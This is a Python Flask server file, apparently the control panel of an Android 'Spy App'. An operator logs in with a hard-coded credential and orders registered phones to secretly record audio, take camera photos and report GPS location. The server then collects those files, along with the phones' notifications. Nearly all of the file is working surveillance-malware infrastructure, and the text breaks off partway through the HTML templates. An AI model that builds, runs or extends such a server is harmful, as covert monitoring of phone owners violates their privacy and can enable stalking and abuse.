import os
import logging
from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
from werkzeug.utils import secure_filename
from threading import Thread, Lock
import time
import json
from datetime import datetime
import uuid

# Initialize Flask app FIRST
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-in-production-12345'
app.config['UPLOAD_FOLDER'] = 'recordings'
app.config['DEVICE_FOLDER'] = 'devices'
app.config['NOTIFICATION_FOLDER'] = 'notifications'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit

# Ensure upload and device directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
os.makedirs(app.config['NOTIFICATION_FOLDER'], exist_ok=True)

# Global variable to track recording signal
recording_signal = False
signal_listeners = []
camera_signal = {'active': False}
location_signal = {'active': False}

# Device-specific signals storage
device_signals = {}
notifications = []
notification_lock = Lock()

# Simple authentication
USERNAME = "Sukh Hacker"
PASSWORD = "sukhbir44@007"  # Change this in production

# Device management functions
def get_device_file_path(device_id):
    return os.path.join(app.config['DEVICE_FOLDER'], f"{device_id}.json")

def load_device_data(device_id):
    device_file = get_device_file_path(device_id)
    if os.path.exists(device_file):
        try:
            with open(device_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_device_data(device_id, data):
    device_file = get_device_file_path(device_id)
    with open(device_file, 'w') as f:
        json.dump(data, f)

def get_all_devices():
    devices = []
    try:
        for filename in os.listdir(app.config['DEVICE_FOLDER']):
            if filename.endswith('.json'):
                device_id = filename[:-5]  # Remove .json extension
                device_data = load_device_data(device_id)
                devices.append({
                    'id': device_id,
                    'name': device_data.get('name', 'Unknown Device'),
                    'model': device_data.get('model', 'Unknown Model'),
                    'last_seen': device_data.get('last_seen', 0),
                    'status': device_data.get('status', 'offline'),
                    'ip_address': device_data.get('ip_address', 'Unknown'),
                    'android_version': device_data.get('android_version', 'Unknown')
                })
    except FileNotFoundError:
        os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
    
    # Sort by last seen (newest first)
    devices.sort(key=lambda x: x['last_seen'], reverse=True)
    return devices

# Notification management
def save_notification(device_id, notification_data):
    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
    notifications_list = []
    
    if os.path.exists(notification_file):
        try:
            with open(notification_file, 'r') as f:
                notifications_list = json.load(f)
        except:
            notifications_list = []
    
    notification_data['id'] = str(uuid.uuid4())
    notification_data['timestamp'] = time.time()
    notification_data['read'] = False
    
    notifications_list.append(notification_data)
    
    # Keep only last 100 notifications
    if len(notifications_list) > 100:
        notifications_list = notifications_list[-100:]
    
    with open(notification_file, 'w') as f:
        json.dump(notifications_list, f)
    
    return notification_data

def get_notifications(device_id):
    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
    if os.path.exists(notification_file):
        try:
            with open(notification_file, 'r') as f:
                notifications = json.load(f)
                # Sort by timestamp (newest first)
                notifications.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
                return notifications
        except:
            return []
    return []

def mark_notification_read(device_id, notification_id):
    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
    if os.path.exists(notification_file):
        try:
            with open(notification_file, 'r') as f:
                notifications = json.load(f)
            
            for notification in notifications:
                if notification.get('id') == notification_id:
                    notification['read'] = True
                    break
            
            with open(notification_file, 'w') as f:
                json.dump(notifications, f)
            
            return True
        except:
            return False
    return False

# Device registration endpoint
@app.route('/register-device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        device_name = data.get('device_name', 'Unknown Device')
        device_model = data.get('device_model', 'Unknown Model')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Device ID required'}), 400
        
        # Load existing device data or create new
        device_data = load_device_data(device_id)
        device_data.update({
            'name': device_name,
            'model': device_model,
            'android_version': android_version,
            'ip_address': ip_address,
            'last_seen': time.time(),
            'status': 'online',
            'first_seen': device_data.get('first_seen', time.time())
        })
        
        # Save device data
        save_device_data(device_id, device_data)
        
        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id} - IP: {ip_address}")
        return jsonify({'ok': True, 'message': 'Device registered successfully'})
        
    except Exception as e:
        print(f"❌ Device registration error: {e}")
        return jsonify({'ok': False, 'error': 'Device registration failed'}), 500

# Device heartbeat endpoint
@app.route('/device-heartbeat', methods=['POST'])
def device_heartbeat():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        ip_address = request.remote_addr
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Device ID required'}), 400
        
        # Update device last seen
        device_data = load_device_data(device_id)
        device_data['last_seen'] = time.time()
        device_data['status'] = 'online'
        device_data['ip_address'] = ip_address
        save_device_data(device_id, device_data)
        
        return jsonify({'ok': True})
        
    except Exception as e:
        print(f"❌ Device heartbeat error: {e}")
        return jsonify({'ok': False, 'error': 'Heartbeat failed'}), 500

# Notification upload endpoint
@app.route('/device/<device_id>/upload-notification', methods=['POST'])
def upload_notification(device_id):
    try:
        data = request.get_json()
        if not data:
            return jsonify({'ok': False, 'error': 'No notification data'}), 400
        
        # Add device info to notification
        data['device_id'] = device_id
        data['device_name'] = load_device_data(device_id).get('name', 'Unknown Device')
        
        # Save notification
        saved_notification = save_notification(device_id, data)
        
        print(f"📢 Notification received from {device_id}: {data.get('title', 'No Title')}")
        return jsonify({'ok': True, 'message': 'Notification saved', 'notification_id': saved_notification['id']})
        
    except Exception as e:
        print(f"❌ Notification upload error: {e}")
        return jsonify({'ok': False, 'error': 'Notification save failed'}), 500

# Get notifications endpoint
@app.route('/device/<device_id>/notifications')
def get_device_notifications(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    notifications_list = get_notifications(device_id)
    return jsonify({'ok': True, 'notifications': notifications_list})

# Mark notification as read
@app.route('/device/<device_id>/notifications/<notification_id>/read', methods=['POST'])
def mark_notification_as_read(device_id, notification_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    success = mark_notification_read(device_id, notification_id)
    if success:
        return jsonify({'ok': True, 'message': 'Notification marked as read'})
    else:
        return jsonify({'ok': False, 'error': 'Notification not found'}), 404

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('devices'))
        return render_template_string(LOGIN_HTML, error='Invalid credentials')
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Devices list route
@app.route('/')
def devices():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    all_devices = get_all_devices()
    
    # Update device status based on last seen
    current_time = time.time()
    for device in all_devices:
        if current_time - device['last_seen'] > 60:  # 1 minute threshold
            device['status'] = 'offline'
    
    return render_template_string(DEVICES_HTML, devices=all_devices)

# Device dashboard route
@app.route('/device/<device_id>')
def device_dashboard(device_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    device_data = load_device_data(device_id)
    if not device_data:
        return "Device not found", 404
    
    # List files for this specific device
    files = []
    photos = []
    location_files = []
    
    upload_dir = app.config['UPLOAD_FOLDER']
    print(f"🔍 Scanning upload directory: {upload_dir}")
    
    try:
        # Check if directory exists
        if not os.path.exists(upload_dir):
            print(f"❌ Upload directory does not exist: {upload_dir}")
            os.makedirs(upload_dir, exist_ok=True)
            print(f"✅ Created upload directory: {upload_dir}")
        
        file_list = os.listdir(upload_dir)
        print(f"📁 Total files in upload directory: {len(file_list)}")
        print(f"📁 Files: {file_list}")
        
        for filename in file_list:
            filepath = os.path.join(upload_dir, filename)
            
            # Check if file belongs to this device
            if filename.startswith(f"{device_id}_"):
                print(f"✅ Found file for device {device_id}: {filename}")
                
                try:
                    file_info = {
                        'name': filename,
                        'size': os.path.getsize(filepath),
                        'modified': os.path.getmtime(filepath),
                        'url': f"/files/{filename}"
                    }
                    
                    if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
                        files.append(file_info)
                        print(f"🎵 Added audio file: {filename}")
                    elif filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                        photos.append(file_info)
                        print(f"🖼️ Added photo file: {filename}")
                    elif filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
                        location_files.append(file_info)
                        print(f"📍 Added location file: {filename}")
                        
                except Exception as e:
                    print(f"❌ Error processing file {filename}: {e}")
                    continue
            else:
                print(f"❌ File {filename} does not belong to device {device_id}")
                    
    except Exception as e:
        print(f"❌ Error reading upload directory: {e}")
        os.makedirs(upload_dir, exist_ok=True)
    
    # Get notifications for this device
    notifications_list = get_notifications(device_id)
    
    # Sort by modification time (newest first)
    files.sort(key=lambda x: x['modified'], reverse=True)
    photos.sort(key=lambda x: x['modified'], reverse=True)
    location_files.sort(key=lambda x: x['modified'], reverse=True)
    
    print(f"📊 Final file counts - Audio: {len(files)}, Photos: {len(photos)}, Locations: {len(location_files)}")
    
    return render_template_string(DEVICE_DASHBOARD_HTML, 
                                 device=device_data, 
                                 device_id=device_id,
                                 files=files, 
                                 photos=photos[:12],
                                 location_files=location_files[:10],
                                 notifications=notifications_list[:20])

# Device-specific camera routes
@app.route('/device/<device_id>/start-camera-signal', methods=['POST'])
def start_device_camera_signal(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    data = request.get_json()
    camera_type = data.get('camera_type', 'front')
    
    # Store device-specific camera signal
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['camera'] = {
        'active': True,
        'camera_type': camera_type,
        'timestamp': time.time()
    }
    
    print(f"Camera signal activated for device {device_id} - {camera_type} camera")
    return jsonify({'ok': True, 'message': f'{camera_type} camera signal sent to {device_id}'})

@app.route('/device/<device_id>/check-camera-signal')
def check_device_camera_signals(device_id):
    camera_signal = device_signals.get(device_id, {}).get('camera', {})
    
    if camera_signal and camera_signal.get('active'):
        if time.time() - camera_signal.get('timestamp', 0) < 30:
            return jsonify({
                'capture': True,
                'camera_type': camera_signal.get('camera_type', 'front')
            })
    
    # Reset signal if expired
    if device_id in device_signals:
        device_signals[device_id]['camera'] = {'active': False}
    
    return jsonify({'capture': False})

@app.route('/device/<device_id>/camera-signal-received', methods=['POST'])
def device_camera_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['camera'] = {'active': False}
    return jsonify({'ok': True})

# Device-specific location routes
@app.route('/device/<device_id>/start-location-signal', methods=['POST'])
def start_device_location_signal(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    # Store device-specific location signal
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['location'] = {
        'active': True,
        'timestamp': time.time()
    }
    
    print(f"Location signal activated for device {device_id}")
    return jsonify({'ok': True, 'message': f'Location signal sent to {device_id}'})

@app.route('/device/<device_id>/check-location-signal')
def check_device_location_signal(device_id):
    location_signal = device_signals.get(device_id, {}).get('location', {})
    
    if location_signal and location_signal.get('active'):
        if time.time() - location_signal.get('timestamp', 0) < 30:
            return jsonify({'get_location': True})
    
    # Reset signal if expired
    if device_id in device_signals:
        device_signals[device_id]['location'] = {'active': False}
    
    return jsonify({'get_location': False})

@app.route('/device/<device_id>/location-signal-received', methods=['POST'])
def device_location_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['location'] = {'active': False}
    return jsonify({'ok': True})

# Device-specific recording routes
@app.route('/device/<device_id>/start-recording', methods=['POST'])
def start_device_recording(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    # Store device-specific recording signal
    if device_id not in device_signals:
        device_signals[device_id] = {}
    
    device_signals[device_id]['recording'] = True
    
    record_time = 15
    if request.is_json:
        data = request.get_json()
        record_time = data.get('record_time', 15)
    
    print(f"Recording signal activated for device {device_id} - {record_time} seconds")
    return jsonify({'ok': True, 'message': f'Recording signal sent to {device_id} - {record_time}s', 'record_time': record_time})

@app.route('/device/<device_id>/check-signal')
def check_device_signal(device_id):
    recording_signal = device_signals.get(device_id, {}).get('recording', False)
    return jsonify({'record': recording_signal})

@app.route('/device/<device_id>/signal-received', methods=['POST'])
def device_signal_received(device_id):
    if device_id in device_signals:
        device_signals[device_id]['recording'] = False
    return jsonify({'ok': True})

# Device-specific upload routes
@app.route('/device/<device_id>/upload-photo', methods=['POST'])
def upload_device_photo(device_id):
    print(f"📸 Upload photo endpoint called for device {device_id}")
    
    if 'photo' not in request.files:
        print("❌ No photo file in request")
        return jsonify({'ok': False, 'error': 'No photo file'}), 400
    
    photo_file = request.files['photo']
    print(f"📸 Photo file details for device {device_id}:")
    print("   - Filename:", photo_file.filename)
    print("   - Content type:", photo_file.content_type)
    print("   - Content length:", photo_file.content_length)
    
    if photo_file.filename == '':
        print("❌ Empty filename")
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if photo_file:
        timestamp = str(int(time.time()))
        filename = f"{device_id}_camera_photo_{timestamp}.jpg"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        try:
            photo_file.save(filepath)
            file_size = os.path.getsize(filepath)
            print(f"✅ Photo saved for device {device_id}: {filename} ({file_size} bytes)")
            
            # Verify file
            if os.path.exists(filepath):
                print(f"✅ Photo verification: EXISTS")
            else:
                print(f"❌ Photo verification: MISSING")
                
            return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
        except Exception as e:
            print(f"❌ File save error: {e}")
            return jsonify({'ok': False, 'error': f'File save failed: {e}'}), 500
    
    print("❌ Unknown upload failure")
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

@app.route('/device/<device_id>/upload-location', methods=['POST'])
def upload_device_location(device_id):
    print(f"📍 Upload location endpoint called for device {device_id}")
    
    try:
        data = request.get_json()
        print(f"📍 Location data received for device {device_id}:", data)
        
        if not data:
            return jsonify({'ok': False, 'error': 'No location data'}), 400
        
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        address = data.get('address', 'Unknown address')
        
        if latitude and longitude:
            # Save location to file with device ID
            timestamp = str(int(time.time()))
            filename = f"{device_id}_location_{timestamp}.txt"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            location_info = f"""Location Captured - Device: {device_id}
Timestamp: {time.ctime()}
Latitude: {latitude}
Longitude: {longitude}
Accuracy: {accuracy} meters
Address: {address}

Google Maps: https://maps.google.com/?q={latitude},{longitude}
"""
            
            with open(filepath, 'w') as f:
                f.write(location_info)
            
            print(f"✅ Location saved for device {device_id}: {filename}")
            return jsonify({'ok': True, 'message': 'Location received', 'filename': filename})
        else:
            return jsonify({'ok': False, 'error': 'Invalid location data'}), 400
            
    except Exception as e:
        print(f"❌ Location upload error for device {device_id}: {e}")
        return jsonify({'ok': False, 'error': f'Location save failed: {e}'}), 500

@app.route('/device/<device_id>/mobile-upload', methods=['POST'])
def mobile_device_upload(device_id):
    try:
        print(f"📱 Mobile upload received for device: {device_id}")
        print(f"📦 Request files: {list(request.files.keys())}")
        print(f"📦 Request form: {request.form}")
        print(f"📦 Request headers: {dict(request.headers)}")
        
        # Check if device exists
        device_data = load_device_data(device_id)
        if not device_data:
            print(f"❌ Device {device_id} not found in registry")
            # But still allow upload for legacy devices
        
        audio_file = None
        if 'file' in request.files:
            audio_file = request.files['file']
            print("✅ Using 'file' field for audio")
        elif 'audio' in request.files:
            audio_file = request.files['audio'] 
            print("✅ Using 'audio' field for audio")
        else:
            print("❌ No audio file found in request.files")
            return jsonify({'ok': False, 'error': 'No audio file found'}), 400
        
        if not audio_file or audio_file.filename == '':
            print("❌ Empty filename or no file selected")
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        # File details debug
        print(f"📁 File details: {audio_file.filename}")
        print(f"📁 Content type: {audio_file.content_type}")
        print(f"📁 Content length: {audio_file.content_length}")
        
        timestamp = str(int(time.time()))
        filename = f"{device_id}_android_recording_{timestamp}.m4a"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        try:
            audio_file.save(filepath)
            file_size = os.path.getsize(filepath)
            print(f"✅ File saved successfully: {filename} ({file_size} bytes)")
            
            # Verify file exists and is readable
            if os.path.exists(filepath):
                print(f"✅ File verification: EXISTS - {filepath}")
            else:
                print(f"❌ File verification: MISSING - {filepath}")
                return jsonify({'ok': False, 'error': 'File save failed'}), 500
                
            return jsonify({
                'ok': True, 
                'message': 'Upload successful', 
                'filename': filename,
                'file_size': file_size
            })
            
        except Exception as save_error:
            print(f"❌ File save error: {save_error}")
            import traceback
            traceback.print_exc()
            return jsonify({'ok': False, 'error': f'File save failed: {save_error}'}), 500
    
    except Exception as e:
        print(f"❌ Upload error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

# Get device-specific photos API
@app.route('/device/<device_id>/get-latest-photos')
def get_device_latest_photos(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    photos = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            if filename.startswith(f"{device_id}_") and filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                filepath = os.path.join(upload_dir, filename)
                photos.append({
                    'name': filename,
                    'url': f"/files/{filename}",
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
    except FileNotFoundError:
        pass
    
    photos.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify({'ok': True, 'photos': photos[:12]})

# Get device-specific location files API
@app.route('/device/<device_id>/get-location-files')
def get_device_location_files(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    location_files = []
    upload_dir = app.config['UPLOAD_FOLDER']
    try:
        for filename in os.listdir(upload_dir):
            if filename.startswith(f"{device_id}_location_") and filename.endswith('.txt'):
                filepath = os.path.join(upload_dir, filename)
                location_files.append({
                    'name': filename,
                    'url': f"/files/{filename}",
                    'size': os.path.getsize(filepath),
                    'modified': os.path.getmtime(filepath)
                })
    except FileNotFoundError:
        pass
    
    location_files.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify({'ok': True, 'locations': location_files[:10]})

# ✅ LEGACY ROUTES FOR EXISTING ANDROID APP COMPATIBILITY

# Legacy recording signal check (device-specific nahi)
@app.route('/check-signal')
def check_signal_legacy():
    """Legacy support for existing Android apps"""
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    for device in all_devices:
        if device['status'] == 'online':
            device_id = device['id']
            recording_signal = device_signals.get(device_id, {}).get('recording', False)
            if recording_signal:
                return jsonify({'record': True, 'record_time': 15})
    
    return jsonify({'record': False})

# Legacy recording start (device-specific nahi)  
@app.route('/start-recording', methods=['POST'])
def start_recording_legacy():
    """Legacy support for existing Android apps"""
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    if all_devices:
        device_id = all_devices[0]['id']  # Pehla online device
        if device_id not in device_signals:
            device_signals[device_id] = {}
        
        device_signals[device_id]['recording'] = True
        
        record_time = 15
        if request.is_json:
            data = request.get_json()
            record_time = data.get('record_time', 15)
        
        print(f"🎙️ Legacy recording signal sent to {device_id}")
        return jsonify({'ok': True, 'message': f'Recording signal sent', 'record_time': record_time})
    
    return jsonify({'ok': False, 'error': 'No devices available'}), 400

# Legacy camera signal check
@app.route('/check-camera-signal')
def check_camera_signal_legacy():
    """Legacy support for existing Android apps"""
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    for device in all_devices:
        if device['status'] == 'online':
            device_id = device['id']
            camera_signal = device_signals.get(device_id, {}).get('camera', {})
            
            if camera_signal and camera_signal.get('active'):
                if time.time() - camera_signal.get('timestamp', 0) < 30:
                    return jsonify({
                        'capture': True,
                        'camera_type': camera_signal.get('camera_type', 'front')
                    })
    
    return jsonify({'capture': False})

# Legacy camera signal start
@app.route('/start-camera-signal', methods=['POST'])
def start_camera_signal_legacy():
    """Legacy support for existing Android apps"""
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    data = request.get_json()
    camera_type = data.get('camera_type', 'front')
    
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    if all_devices:
        device_id = all_devices[0]['id']  # Pehla online device
        
        device_signals[device_id] = {
            'camera': {
                'active': True,
                'camera_type': camera_type,
                'timestamp': time.time()
            }
        }
        
        print(f"📸 Legacy camera signal sent to {device_id}")
        return jsonify({'ok': True, 'message': f'Camera signal sent'})
    
    return jsonify({'ok': False, 'error': 'No devices available'}), 400

# Legacy location signal check
@app.route('/check-location-signal')
def check_location_signal_legacy():
    """Legacy support for existing Android apps"""
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    for device in all_devices:
        if device['status'] == 'online':
            device_id = device['id']
            location_signal = device_signals.get(device_id, {}).get('location', {})
            
            if location_signal and location_signal.get('active'):
                if time.time() - location_signal.get('timestamp', 0) < 30:
                    return jsonify({'get_location': True})
    
    return jsonify({'get_location': False})

# Legacy location signal start
@app.route('/start-location-signal', methods=['POST'])
def start_location_signal_legacy():
    """Legacy support for existing Android apps"""
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    # Kisi bhi online device ko signal bhejo
    all_devices = get_all_devices()
    if all_devices:
        device_id = all_devices[0]['id']  # Pehla online device
        
        if device_id not in device_signals:
            device_signals[device_id] = {}
        
        device_signals[device_id]['location'] = {
            'active': True,
            'timestamp': time.time()
        }
        
        print(f"📍 Legacy location signal sent to {device_id}")
        return jsonify({'ok': True, 'message': f'Location signal sent'})
    
    return jsonify({'ok': False, 'error': 'No devices available'}), 400

# Legacy signal received
@app.route('/signal-received', methods=['POST'])
def signal_received_legacy():
    """Legacy support for existing Android apps"""
    # Sabhi devices se signal clear karo
    for device_id in list(device_signals.keys()):
        if 'recording' in device_signals[device_id]:
            device_signals[device_id]['recording'] = False
    
    return jsonify({'ok': True})

# Legacy camera signal received
@app.route('/camera-signal-received', methods=['POST'])
def camera_signal_received_legacy():
    """Legacy support for existing Android apps"""
    # Sabhi devices se camera signal clear karo
    for device_id in list(device_signals.keys()):
        if 'camera' in device_signals[device_id]:
            device_signals[device_id]['camera'] = {'active': False}
    
    return jsonify({'ok': True})

# Legacy location signal received  
@app.route('/location-signal-received', methods=['POST'])
def location_signal_received_legacy():
    """Legacy support for existing Android apps"""
    # Sabhi devices se location signal clear karo
    for device_id in list(device_signals.keys()):
        if 'location' in device_signals[device_id]:
            device_signals[device_id]['location'] = {'active': False}
    
    return jsonify({'ok': True})

# Legacy file upload routes
@app.route('/mobile-upload', methods=['POST'])
def mobile_upload_legacy():
    """Legacy support for existing Android apps"""
    try:
        print("📱 Legacy mobile upload received")
        
        # Try to get device ID from various sources
        device_id = "unknown_device"
        
        audio_file = None
        if 'file' in request.files:
            audio_file = request.files['file']
        elif 'audio' in request.files:
            audio_file = request.files['audio']
        
        if not audio_file or audio_file.filename == '':
            return jsonify({'ok': False, 'error': 'No file selected'}), 400
        
        timestamp = str(int(time.time()))
        filename = f"legacy_android_recording_{timestamp}.m4a"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        audio_file.save(filepath)
        
        file_size = os.path.getsize(filepath)
        print(f"✅ Legacy recording uploaded: {filename} ({file_size} bytes)")
        return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
    
    except Exception as e:
        print(f"❌ Legacy upload error: {e}")
        return jsonify({'ok': False, 'error': 'Upload failed'}), 500

@app.route('/mobile-upload-photo', methods=['POST'])
def mobile_upload_photo_legacy():
    """Legacy support for existing Android apps"""
    print("📸 Legacy photo upload received")
    
    if 'photo' not in request.files:
        return jsonify({'ok': False, 'error': 'No photo file'}), 400
    
    photo_file = request.files['photo']
    if photo_file.filename == '':
        return jsonify({'ok': False, 'error': 'No file selected'}), 400
    
    if photo_file:
        timestamp = str(int(time.time()))
        filename = f"legacy_camera_photo_{timestamp}.jpg"
        
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        photo_file.save(filepath)
        
        file_size = os.path.getsize(filepath)
        print(f"✅ Legacy photo uploaded: {filename} ({file_size} bytes)")
        return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
    
    return jsonify({'ok': False, 'error': 'Upload failed'}), 500

@app.route('/upload-location', methods=['POST'])
def upload_location_legacy():
    """Legacy support for existing Android apps"""
    print("📍 Legacy location upload received")
    
    try:
        data = request.get_json()
        print("📍 Legacy location data:", data)
        
        if not data:
            return jsonify({'ok': False, 'error': 'No location data'}), 400
        
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        
        if latitude and longitude:
            timestamp = str(int(time.time()))
            filename = f"legacy_location_{timestamp}.txt"
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            
            location_info = f"""Location Captured - Legacy Device
Timestamp: {time.ctime()}
Latitude: {latitude}
Longitude: {longitude}
Accuracy: {accuracy} meters

Google Maps: https://maps.google.com/?q={latitude},{longitude}
"""
            
            with open(filepath, 'w') as f:
                f.write(location_info)
            
            print(f"✅ Legacy location saved: {filename}")
            return jsonify({'ok': True, 'message': 'Location received', 'filename': filename})
        else:
            return jsonify({'ok': False, 'error': 'Invalid location data'}), 400
            
    except Exception as e:
        print(f"❌ Legacy location upload error: {e}")
        return jsonify({'ok': False, 'error': f'Location save failed: {e}'}), 500

# File download route
@app.route('/files/<filename>')
def download_file(filename):
    """File download route"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    try:
        return send_file(
            os.path.join(app.config['UPLOAD_FOLDER'], filename),
            as_attachment=True,
            download_name=filename
        )
    except FileNotFoundError:
        return "File not found", 404

# File delete route
@app.route('/delete-file/<filename>', methods=['POST'])
def delete_file(filename):
    """File delete route"""
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    try:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            return jsonify({'ok': True, 'message': 'File deleted'})
        else:
            return jsonify({'ok': False, 'error': 'File not found'}), 404
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# Clear all notifications for device
@app.route('/device/<device_id>/clear-notifications', methods=['POST'])
def clear_notifications(device_id):
    if not session.get('logged_in'):
        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
    
    try:
        notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
        if os.path.exists(notification_file):
            os.remove(notification_file)
        
        return jsonify({'ok': True, 'message': 'All notifications cleared'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)}), 500

# Debug route to check devices
@app.route('/debug-devices')
def debug_devices():
    devices = get_all_devices()
    return jsonify({
        'total_devices': len(devices),
        'devices': devices
    })

# Debug route to check uploads
@app.route('/debug-uploads')
def debug_uploads():
    """Debug route to check uploaded files"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    upload_dir = app.config['UPLOAD_FOLDER']
    files = []
    
    try:
        for filename in os.listdir(upload_dir):
            filepath = os.path.join(upload_dir, filename)
            files.append({
                'name': filename,
                'size': os.path.getsize(filepath),
                'modified': time.ctime(os.path.getmtime(filepath)),
                'path': filepath
            })
    except Exception as e:
        return jsonify({'error': str(e)})
    
    # Sort by modification time
    files.sort(key=lambda x: os.path.getmtime(x['path']), reverse=True)
    
    return jsonify({
        'upload_folder': upload_dir,
        'total_files': len(files),
        'files': files
    })

# ✅ HTML TEMPLATES

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Login - Spy App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #555; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .error { color: red; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>🔐 Spy App Login</h1>
        <form method="POST">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
            {% if error %}
                <div class="error">{{ error }}</div>
            {% endif %}
        </form>
    </div>
</body>
</html>
"""

DEVICES_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Devices - Spy App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        h1 { color: #333; margin: 0; }
        .logout-btn { background: #dc3545; color: white; padding: 8px 15px; text-decoration: none; border-radius: 5px; }
        .logout-btn:hover { background: #c82333; }
